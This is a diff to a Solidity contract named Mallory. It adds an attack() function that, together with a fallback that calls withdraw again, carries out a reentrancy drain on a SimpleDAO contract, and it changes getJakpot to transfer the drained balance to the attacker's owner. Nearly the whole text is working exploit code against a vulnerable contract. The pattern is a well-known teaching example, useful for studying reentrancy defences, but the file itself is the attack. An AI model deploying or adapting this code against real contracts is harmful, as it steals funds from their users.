@@ -12,6 +12,10 @@ contract Mallory {
         dao = SimpleDAO(_daoAddress);
     }
 
+    function attack() public {
+        dao.donate{value: 1}(address(this));
+        dao.withdraw(1);
+    }
     fallback() external { dao.withdraw(dao.queryCredit(address(this))); }
-    function getJakpot() public { owner.send(address(this).balance); }
+    function getJakpot() public { owner.transfer(address(this).balance); }
 }
